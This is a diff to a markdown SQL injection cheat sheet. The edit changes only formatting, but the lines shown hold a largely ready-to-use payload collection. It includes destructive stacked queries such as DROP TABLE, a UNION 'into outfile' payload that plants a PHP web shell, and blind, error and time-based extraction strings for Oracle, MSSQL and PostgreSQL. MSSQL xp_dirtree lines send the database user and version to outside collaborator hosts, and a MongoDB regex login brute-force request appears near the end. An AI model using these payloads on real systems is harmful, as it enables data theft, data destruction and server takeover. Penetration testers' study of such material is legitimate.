@@ -6,15 +6,19 @@
 
 How an example of unsecure sql statement looks like:
 
-```
+{% code overflow="wrap" %}
+```sql
 $SQL = "SELECT * FROM {tablename} WHERE {username} = ' + $_POST["username"] + ' AND ' + $_POST['password']'";
 ```
+{% endcode %}
 
 To break the statement:
 
-```
+{% code overflow="wrap" %}
+```sql
 $SQL = "SELECT * FROM {tablename} WHERE {username} = ' + 1' OR 1+1-- + ' AND ' + $_POST['password']'";
 ```
+{% endcode %}
 
 Order by:
 
@@ -45,7 +49,7 @@ SELECT COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "[TABLE
 
 ### Simple SQL injection test
 
-```
+```sql
 '
 1' OR 1+1--
 \'
@@ -53,13 +57,13 @@ SELECT COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "[TABLE
 
 ### Stacked injection; Where table name is known
 
-```
+```sql
 1'; DROP TABLE {tablename} --
 ```
 
 ### Where column name is known
 
-```
+```sql
 1'; ALTER TABLE {tablename} ALTER COLUMN {columnname} {datatype} --
 1' UNION SELECT {columnname} FROM {tablename};--
 1' UNION ALL SELECT {columnname} FROM {tablename};--
@@ -69,19 +73,22 @@ SELECT COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "[TABLE
 
 Apply in URL
 
-```
+```sql
 www.example.com/xxx.php?id=1 or 1=1
 ```
 
 ## RCE with UNION
 
-```
+{% code overflow="wrap" %}
+```sql
 123' UNION SELECT '<?php echo system("ls -la /");?>','2','3','4','5' into outfile '/var/www/html/shell.php'#
 ```
+{% endcode %}
 
 ## Oracle DB
 
-```
+{% code overflow="wrap" %}
+```sql
 ' UNION SELECT table_name,null,null FROM all_tables--
 ' UNION SELECT  column_name,null,null FROM all_tab_columns WHERE table_name=''--
 ' UNION SELECT [col1],[col2],null FROM [table]--
@@ -89,10 +96,12 @@ www.example.com/xxx.php?id=1 or 1=1
 ' AND (SELECT LENGTH(global_name) FROM global_name)=8 AND 'AdhT'='AdhT    # word count
 ' AND SUBSTRC((SELECT global_name FROM global_name),1,1)=65 AND 'AdhT'='AdhT    # Ascii decode
 ```
+{% endcode %}
 
 ## Microsoft SQL Server
 
-```
+{% code overflow="wrap" %}
+```sql
 --------------------Union-Based----------------------
 ' OR LEN(CURRENT_USER)='3
 ' OR SUBSTRING(CURRENT_USER,1,3)='DBO
@@ -126,12 +135,14 @@ allllcs' OR SUBSTRING(CURRENT_USER,1,3)='DBO';--
 ';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(USER_NAME(1),1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
 ');declare @q varchar(200);set @q='\\fj2meelkqbazaz61dntl0yzycpih69uy.'+(SELECT SUBSTRING(@@version,1,9))+'.oasti'+'fy.com\huh'; exec master.dbo.xp_dirtree @q;--
 ```
+{% endcode %}
 
 ***
 
 **Sample Database**
 
-```
+{% code overflow="wrap" %}
+```sql
 Database name: ChristmasInc
 Database table: employee
 
@@ -149,10 +160,12 @@ SELECT * FROM employee;
 | 4            | Snow Man               | Admin                     |  01-02-1982    |
 +--------------+------------------------+---------------------------+----------------+
 ```
+{% endcode %}
 
 **Vulnerable SQL Statement**
 
-```
+{% code overflow="wrap" %}
+```sql
 sqlquery = "SELECT * FROM employee WHEN emp_name LIKE '%" + userinput + "%' ORDERY BY emp_id;"
 userinput = "an"
 
@@ -169,6 +182,7 @@ userinput = "an"
 | 4      | Snow Man    | Admin        |  01-02-1982 |
 +--------+-------------+--------------+-------------+
 ```
+{% endcode %}
 
 #### Boolean-based Blind SQLi
 
@@ -182,7 +196,8 @@ When a true or false condition is present, result will be shown when a true stat
 
 Use the LEN() function to find how many character the database name present:
 
-```
+{% code overflow="wrap" %}
+```sql
 userinput = "' OR LEN(db_name())=1;--"
 # returns false, no data is retrieved:
 SELECT * FROM employee WHERE emp_name LIKE '%' AND LEN(db_name())=1;--%' ORDER BY emp_id;
@@ -197,10 +212,12 @@ userinput = "' OR LEN(db_name())=12;--"
 # returns true, data is returned:
 SELECT * FROM employee WHERE emp_name LIKE '%' AND LEN(db_name())=12;--%' ORDER BY emp_id;
 ```
+{% endcode %}
 
 Use the SUBSTRING() function to find each character of the database name:
 
-```
+{% code overflow="wrap" %}
+```sql
 # check if the first letter of the database name is A:
 userinput = "' AND SUBSTRING(db_name(),1,1)='A';--"
 # returns FALSE, no data is retrieved:
@@ -230,6 +247,7 @@ userinput = "' AND SUBSTRING(db_name(),1,12)='ChristmasInc';--"
 # returns TRUE, data is returned:
 SELECT * FROM employee WHERE emp_name LIKE '%' AND SUBSTRING(db_name(),1,12)='ChristmasInc';--%' ORDER BY emp_id;
 ```
+{% endcode %}
 
 ***
 
@@ -241,11 +259,13 @@ When a misconfigured database outputs SQL error message to the user, an error-ba
 
 Attempting to convert a VARCHAR value into INT will trigger a SQL Error:
 
-```
+{% code overflow="wrap" %}
+```sql
 userinput = "' AND 1=CONVERT(INT,@@version);--"
 # complete query
 SELECT * FROM employee WHERE emp_name LIKE '%' AND 1=CONVERT(INT,@@version);--%' ORDER BY emp_id;
 ```
+{% endcode %}
 
 Error message with the desired output:
 
@@ -267,7 +287,8 @@ Secondly, the columns on both side must have the same data type.
 
 Number of columns for the first table and the second must be the same:
 
-```
+{% code overflow="wrap" %}
+```sql
 # Number of columns on both side are different, statement invalid:
 SELECT column1, column2, column3 FROM table1 UNION ALL SELECT columnX FROM table2;
 
@@ -277,12 +298,14 @@ SELECT column1, column2, column3 FROM table1 UNION ALL SELECT columnX, columnY F
 # Number of columns on both side matches, statement is valid:
 SELECT column1, column2, column3 FROM table1 UNION ALL SELECT columnX, columnY, columnZ FROM table2;
 ```
+{% endcode %}
 
 **Condition 2 (Same data type)**
 
 The data type of each relative column must be the same:
 
-```
+{% code overflow="wrap" %}
+```sql
 # Data type of columns1 and columnX is different, statement invalid:
 SELECT column1(int) FROM table1 UNION ALL SELECT columnX(date) FROM table2;
 
@@ -292,6 +315,7 @@ SELECT column1(int), column2(date), column3(varchar) FROM table1 UNION ALL SELEC
 # Data type of all columns from table1 and table 2 are the same , statement is valid:
 SELECT column1(int), column2(date), column3(varchar) FROM table1 UNION ALL SELECT columnX(int), columnY(date), columnZ(varchar) FROM table2;
 ```
+{% endcode %}
 
 #### Time-based Blind SQLi
 
@@ -299,7 +323,8 @@ SELECT column1(int), column2(date), column3(varchar) FROM table1 UNION ALL SELEC
 
 ## PostgreSQL
 
-```
+{% code overflow="wrap" %}
+```sql
 -------------------Boolean-Based---------------------
 ' or substr(current_database(),1,3) = 'tes
 ' or substr(version(),1,10) = 'PostgreSQL
@@ -313,10 +338,12 @@ SELECT column1(int), column2(date), column3(varchar) FROM table1 UNION ALL SELEC
 ';SELECT PG_SLEEP(5)--
 ' AND 6826=(SELECT 6826 FROM PG_SLEEP(5))--
 ```
+{% endcode %}
 
 ## NodeJS / MongoDB
 
-```
+{% code overflow="wrap" %}
+```sql
 POST /login HTTP/1.1
 Host: 10.10.11.139:5000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
@@ -332,3 +359,4 @@ Upgrade-Insecure-Requests: 1
 
 {"user":"admin","password":{"$regex":"^A"}}    # bruteforce password start with A
 ```
+{% endcode %}
